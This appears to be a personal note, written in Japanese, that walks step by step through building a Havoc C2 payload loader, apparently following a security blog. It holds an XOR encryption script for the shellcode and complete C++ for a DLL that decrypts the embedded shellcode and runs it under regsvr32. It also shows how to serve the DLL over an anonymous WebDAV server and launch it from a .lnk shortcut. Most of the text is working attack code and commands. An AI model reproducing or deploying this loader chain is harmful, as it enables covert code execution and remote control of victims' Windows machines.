---
title: Test2
parent: Havoc
grand_parent:
---


https://minder-security.ghost.io/weaponizing-webdav-stealthy-dll-execution-with-regsvr32-and-havoc-c2/

# File List

- encrypted.bin (demon.x64.bin)
- resource.h
- mydll.rc
- mydll.cpp

---
# 手順

## 1. demon.x64.binの生成

![[Pasted image 20260827213817.png]]

# 2. encrypted.binの作成

xor_encrypt.py
```python
import sys

def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <source_file> <xor_key> <output_file>")
        sys.exit(1)

    source_file = sys.argv[1]
    xor_key = sys.argv[2]
    output_file = sys.argv[3]

    with open(source_file, "rb") as f:
        data = f.read()

    encrypted = xor_encrypt(data, xor_key)

    with open(output_file, "wb") as f:
        f.write(encrypted)

    print(f"|+| Encrypted {len(data)} bytes")
    print(f"|+| Key: {xor_key}")
    print(f"|+| Output: {output_file}")

if __name__ == "__main__":
    main()

```

## Encode

```python
python xor_encrypt.py havoc.x64.bin xhorrox encrypted.bin
```


# 3. リソースファイルの作成と蔵置

resourch.h
```h
#pragma once
#define IDR_RCDATA1 101
```
![[Pasted image 20260827215241.png]]

mydll.rc
```rc
#include "resource.h"

IDR_RCDATA1 RCDATA "encrypted.bin"
```
![[Pasted image 20260827215256.png]]

## File Path

以下の場所に蔵置

```
MyDllProject/
├── dllmain.cpp
├── pch.h                     <-- 勝手に作られる
├── resource.h
├── mydll.rc                  <-- ここに .rc を置く
└── encrypted.bin   <-- ★同じフォルダに置くのが一番安全
```

## リソースファイルの追加
```
方法1: Visual Studioのプロジェクトに追加する
1. Visual Studioの右側にある 「ソリューション エクスプローラー」 を開きます。
2. 「リソース ファイル」 というフォルダ（フィルター）を右クリックします。
3. 「追加」 ＞ 「既存の項目...」 をクリックします。
4. 先ほど作成した ⁠resource.h⁠ と ⁠mydll.rc⁠ を選択して「追加」します。
これで、ビルド時にシェルコードのバイナリがDLLの内部（リソース）に埋め込まれます。

方法2：Visual StudioのGUI（リソースエディター）から追加する
コードを書かずに画面操作だけで追加したい場合は、以下の手順で行います。
5. ソリューションエクスプローラーの 「リソース ファイル」 を右クリック ＞ 「追加」 ＞ 「リソース...」 を選択します。
6. リソースの種類の選択画面で 「Custom」（カスタム）を選び、「新しいリソースのインポート...」 をクリックします。
7. 暗号化された ⁠.bin⁠ ファイルを選択します。
8. リソースの種類（Type）を聞かれるので、半角大文字で ⁠RCDATA⁠ と入力して「OK」を押します。
9. 自動的に ⁠resource.h⁠ と ⁠.rc⁠ が生成され、リソースIDが割り振られます（必要に応じてコード側の ⁠IDR_RCDATA1⁠ を自動生成されたID名・番号に合わせてください）。
```

# 4. mydll.dllファイルの作成

mydll.cpp
```cpp
/***
*  DLL to be loaded using regsvr32.exe
*  Howto:
*    - Encode shellcode bin file using Tools\xor_encrypt.py
*    - Add the encrypted bin file as resource
*    - Change the XOR key within this code to your specified xor key
*    - Run with `regsvr32.exe /u mydll.dll`
***/

#include "pch.h"
#include "resource.h"
#include <windows.h>

HMODULE hDll = NULL;

#if defined(_WIN64)
#pragma comment(linker, "/EXPORT:DllUnregisterServer")
#else
#pragma comment(linker, "/EXPORT:DllUnregisterServer=_DllUnregisterServer@16")
#endif

// もとの引数ありの定義に戻しています
extern "C" void __stdcall DllUnregisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {

    MessageBoxA(NULL, "|+| DllUnregisterServer started", "Debug", MB_OK);

    HRSRC hRes = FindResource(hDll, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

    if (hRes == NULL) {
        char errDesc[128];
        wsprintfA(errDesc, "|!| FindResource failed with code: %d", GetLastError());
        MessageBoxA(NULL, errDesc, "Debug", MB_OK);
        return;
    }

    HGLOBAL hData = LoadResource(hDll, hRes);
    if (!hData) {
        MessageBoxA(NULL, "|!| LoadResource failed", "Debug", MB_OK);
        return;
    }

    void* pPayload = LockResource(hData);
    DWORD dwSize = SizeofResource(hDll, hRes);

    char sizeMsg[64];
    wsprintfA(sizeMsg, "|+| Shellcode size: %d bytes", dwSize);
    MessageBoxA(NULL, sizeMsg, "Debug", MB_OK);

    // 1. メモリを RW（読み書き可能）で確保
    LPVOID exec_mem = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        MessageBoxA(NULL, "|!| VirtualAlloc failed", "Debug", MB_OK);
        return;
    }

    RtlMoveMemory(exec_mem, pPayload, dwSize);

    // XOR Key (必要に応じて変更)
    const char key[] = "xhorrox";
    size_t keyLen = sizeof(key) - 1;
    char* pMemory = (char*)exec_mem;
    for (DWORD i = 0; i < dwSize; i++) {
        pMemory[i] = pMemory[i] ^ key[i % keyLen];
    }

    // 2. メモリ保護を RX（読み取り・実行可能）に変更
    DWORD oldProtect = 0;
    if (!VirtualProtect(exec_mem, dwSize, PAGE_EXECUTE_READ, &oldProtect)) {
        MessageBoxA(NULL, "|!| VirtualProtect failed", "Debug", MB_OK);
        return;
    }

    MessageBoxA(NULL, "3. About to Execute Shellcode", "Debug", MB_OK);

    // 3. 新しいスレッドを作成してシェルコードを実行
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        MessageBoxA(NULL, "|!| CreateThread failed", "Debug", MB_OK);
        return;
    }
    
    // スレッドの終了を待つ必要がある場合はここで待機（必要に応じてコメントアウト解除）
    // WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // リソースアクセス用にモジュールハンドルを保持
        hDll = hModule;
        break;
    }
    return TRUE;
}
```

## Build

# 実行

```powershell
C:\Windows\System32\regsvr32.exe /u C:\Users\admin\source\repos\mydll\x64\Debug\mydll.dll
```
![[Pasted image 20260827221711.png]]

# Extra

## webdav



```zsh
└─$ ll
total 4
drwxrwxr-x 2 kali kali 4096 Aug 27 23:06 webdav
```
![[Pasted image 20260827233305.png]]

![[Pasted image 20260827233430.png]]

### shortcut.lnkの作成

![[Pasted image 20260827233543.png]]

リンク先```
```
C:\Windows\System32\regsvr32.exe /u \\192.168.11.27@9999\DAVWWWRoot\webdav\mydll.dll
```

作業フォルダ

```
\\192.168.11.27@9999\DAVWWWRoot\webdav
```

```zsh
wsgidav --host=0.0.0.0 --port=9999 --root=webdav/../ --auth=anonymous
```

![[Pasted image 20260827233355.png]]

